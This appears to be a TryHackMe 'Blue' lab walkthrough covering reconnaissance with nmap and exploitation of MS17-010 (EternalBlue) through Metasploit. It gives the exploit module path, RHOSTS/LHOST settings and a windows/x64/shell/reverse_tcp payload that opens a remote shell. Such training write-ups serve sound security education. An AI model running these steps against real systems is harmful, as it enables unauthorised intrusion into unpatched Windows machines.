# Blue

Room: [Blue](https://tryhackme.com/room/blue)

Rrerequisite Rooms:
1. [Nmap](https://tryhackme.com/room/furthernmap)
2. [Metasploit](https://tryhackme.com/module/metasploit)

<img width="932" height="189" alt="image" src="https://github.com/user-attachments/assets/e935a766-a301-4bec-ac14-56a4ff8c48b3" />

## Recon

Start the Lab Machine and if using your Kali Machine, connect to the TryHackMe server by `sudo openvpn <FILENAME>`

### Answer the questions below

1. Scan the machine.

write `nmap <TARGET_IP>` to scan the target system.

<img width="331" height="170" alt="image" src="https://github.com/user-attachments/assets/0e777977-f231-4a12-ba35-fa03bef896d8" />

2. How many ports are open with a port number under 1000?

3 (ports 135, 139 and 445)

4. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

ms17-010

Specifically for the EternalBlue room, you can check the smb vulnerability by: `nmap --script smb-vuln* -p445 <TARGET_IP>`

<img width="521" height="276" alt="image" src="https://github.com/user-attachments/assets/908f5d81-00c1-442e-bcef-b416f061ba94" />

This vulnerability corresponds to [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/cve-2017-0143), commonly known as EternalBlue, a critical flaw in the SMBv1 (Server Message Block version 1) protocol that allows remote attackers to execute arbitrary code on affected Windows systems without authentication.

## Gain Access

### Answer the questions below

1. Start Metasploit.

Write command: `msfconsole`

<img width="350" height="335" alt="image" src="https://github.com/user-attachments/assets/679c2023-218f-4c8b-9ed7-e65a508fddcd" />

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Write command: `search ms17-010` to find the path of the exploit. The first option 0 is the answer: `exploit/windows/smb/ms17_010_eternalblue`

<img width="848" height="248" alt="image" src="https://github.com/user-attachments/assets/df858c6e-6009-43c6-b635-6f71d57f936a" />

Write command `use 0` to select the desired path.

<img width="598" height="78" alt="image" src="https://github.com/user-attachments/assets/a7f4a546-43aa-47b1-b1b3-110f0d31cf94" />

3. Show options and set the one required value. What is the name of this value? (All caps for submission)

Check the parameters by command: `show options`. RHOSTS is the answer of this question.

<img width="1300" height="529" alt="image" src="https://github.com/user-attachments/assets/f8a32932-7349-4250-b95c-5d027d236a1d" />

Set the `RHOSTS` parameter by: `set RHOSTS <TARGET_IP>`

Set the `LHOST` paremeter by: `set LHOST <YOUR_TUN0_IP>`. You can see your TryHackMe IP by `ipconfig`

<img width="1044" height="607" alt="image" src="https://github.com/user-attachments/assets/a982b077-4f42-4d06-bf41-1a2e9c691998" />

4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp`. With that done, run the exploit!

<img width="455" height="40" alt="image" src="https://github.com/user-attachments/assets/b5e8ac91-ee59-4938-ac41-880d8a3f1929" />

Then write command: `exploit` to run the exploit:

<img width="1104" height="499" alt="image" src="https://github.com/user-attachments/assets/ad9b3792-0d9b-49b1-a02a-cb29ee2e663c" />














